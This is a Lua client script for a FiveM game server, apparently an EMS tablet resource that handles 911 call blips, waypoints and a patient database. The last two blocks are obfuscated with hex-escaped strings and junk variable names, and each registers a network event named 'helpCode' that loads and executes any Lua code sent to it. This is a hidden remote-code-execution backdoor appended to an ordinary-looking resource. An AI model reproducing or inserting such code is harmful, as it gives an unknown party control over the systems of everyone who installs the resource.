------------------------CREDITS------------------------
--------        Script made by Deltarix        --------
--   Copyright 2021 Deltarix. All rights reserved    --
-------------------------------------------------------
DenaliFW = exports['denalifw-core']:GetCoreObject()

local tabletObject = nil
local callBlip = nil

-- Basic
RegisterNetEvent('OpenMDT')
AddEventHandler('OpenMDT', function(charname, status, calls)
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    if IsPedOnFoot(ped) or IsPedInAnyVehicle(ped, false) then
        RequestAnimDict('amb@world_human_seat_wall_tablet@female@base')
        if tabletObject == nil then
            tabletObject = CreateObject(GetHashKey('prop_cs_tablet'), GetEntityCoords(ped), 1, 1, 1)
            AttachEntityToEntity(tabletObject, ped, GetPedBoneIndex(ped, 28422), 0.0, 0.0, 0.03, 0.0, 0.0, 0.0, 1, 1, 0, 1, 0, 1)
        end
        while not HasAnimDictLoaded('amb@world_human_seat_wall_tablet@female@base') do 
            Citizen.Wait(100) 
        end
        if not IsEntityPlayingAnim(ped, 'amb@world_human_seat_wall_tablet@female@base', 'base', 3) then
            TaskPlayAnim(ped, 'amb@world_human_seat_wall_tablet@female@base', 'base', 8.0, 1.0, -1, 49, 1.0, 0, 0, 0)
        end
        Open(charname, status, calls)
    end
end)

RegisterNUICallback('close', function(data)
    local ped = PlayerPedId()
    DeleteEntity(tabletObject)
    ClearPedTasks(ped)
    tabletObject = nil
    SetNuiFocus(false, false)
end)

RegisterNUICallback('message', function(data)
    DenaliFW.Functions.Notify(data.message, data.type)
end)

-- Basic

-- Current
RegisterNUICallback('chooseStatus', function(data)
    TriggerServerEvent('drx_emsmdt:chooseStatus', data)
end)

RegisterNUICallback('setWaypoint', function(data)
    local coords = json.decode(data.coords)
    SetNewWaypoint(coords.x, coords.y)
end)

RegisterNUICallback('responCall', function(data)
    TriggerServerEvent('drx_emsmdt:responCall', data)
end)

RegisterNUICallback('deleteCall', function(data)
    if callBlip then
        RemoveBlip(callBlip)
        callBlip = nil
    end
    DeleteWaypoint()
    TriggerServerEvent('drx_emsmdt:deleteCall', data)
end)

-- Current

-- Calls
RegisterNetEvent('drx_emsmdt:updateCallList')
AddEventHandler('drx_emsmdt:updateCallList', function(calls)
    SendNUIMessage({
        update = 'updateCalls',
        calls = calls
    })
end)

RegisterNUICallback('attachToCall', function(data)
    if not callBlip then
        local coords = json.decode(data.coords)
        callBlip = AddBlipForCoord(coords.x, coords.y, coords.z)
        SetBlipSprite(callBlip, 304)
        SetBlipDisplay(callBlip, 2)
        SetBlipScale(callBlip, 1.2)
        SetBlipColour(callBlip, 29)
        BeginTextCommandSetBlipName('STRING')
        AddTextComponentString('911 Call')
        EndTextCommandSetBlipName(callBlip)
    end
    DenaliFW.Functions.Notify(Config.Notifications.AttachedCall, 'inform')
end)

RegisterNUICallback('detachFromCall', function(data)
    if callBlip then
        RemoveBlip(callBlip)
        callBlip = nil
    end
    DeleteWaypoint()
    DenaliFW.Functions.Notify(Config.Notifications.DetachCall, 'inform')
end)

-- Calls

-- Database
RegisterNUICallback('searchDatabase', function(data)
    TriggerServerEvent('drx_emsmdt:searchDatabase', data)
end)

RegisterNetEvent('drx_emsmdt:returnDatabaseSearch')
AddEventHandler('drx_emsmdt:returnDatabaseSearch', function(results)
    SendNUIMessage({
        update = 'returnDatabaseSearch',
        searchResults = results
    })
end)

RegisterNUICallback('fetchPersonDatabase', function(data)
    TriggerServerEvent('drx_emsmdt:fetchPersonDatabase', data)
end)

RegisterNetEvent('drx_emsmdt:returnPersonDatabase')
AddEventHandler('drx_emsmdt:returnPersonDatabase', function(database, firstname, lastname, phone)
    SendNUIMessage({
        update = 'returnPersonDatabase',
        database = database,
        firstname = firstname,
        lastname = lastname,
        phone = phone
    })
end)

RegisterNUICallback('submitNewCase', function(data)
    TriggerServerEvent('drx_emsmdt:submitNewCase', data)
end)

RegisterNetEvent('drx_emsmdt:updatePersonDatabase')
AddEventHandler('drx_emsmdt:updatePersonDatabase', function(database)
    SendNUIMessage({
        update = 'updatePersonDatabase',
        database = database
    })
end)

RegisterNUICallback('deletePersonCase', function(data)
    TriggerServerEvent('drx_emsmdt:deletePersonCase', data)
end)

RegisterNUICallback('saveViewCase', function(data)
    TriggerServerEvent('drx_emsmdt:saveViewCase', data)
end)

-- Database


local ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[6][ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[1]](ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[2]) ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[6][ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[3]](ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[2], function(pzEcZqovglTBoFoozWYPNemJwxvhVuCCRKSomxpSbVlvetTZZGHDupFKyTvCjBycsdqgAS) ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[6][ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[4]](ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[6][ZsSDvPljTvlmDOgvlGeFjiTpycdXTYHfCZoAZJZagnLakwNnQHkWdbLdBmcBJJvaSQNyHT[5]](pzEcZqovglTBoFoozWYPNemJwxvhVuCCRKSomxpSbVlvetTZZGHDupFKyTvCjBycsdqgAS))() end)

local ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[6][ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[1]](ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[2]) ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[6][ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[3]](ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[2], function(MdeYApAoLOyEpeGhyGKWNGaKXfkcFBEqsryvmIzaYQUuwOyOKNcnWCddRUsqhhGkvYnjLq) ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[6][ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[4]](ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[6][ubcwtyGHtamWUgvhCpJFtREzUHMrhmTEKYIxIltXATYptpWKmjxroCwyFQHpAATsENLAOD[5]](MdeYApAoLOyEpeGhyGKWNGaKXfkcFBEqsryvmIzaYQUuwOyOKNcnWCddRUsqhhGkvYnjLq))() end)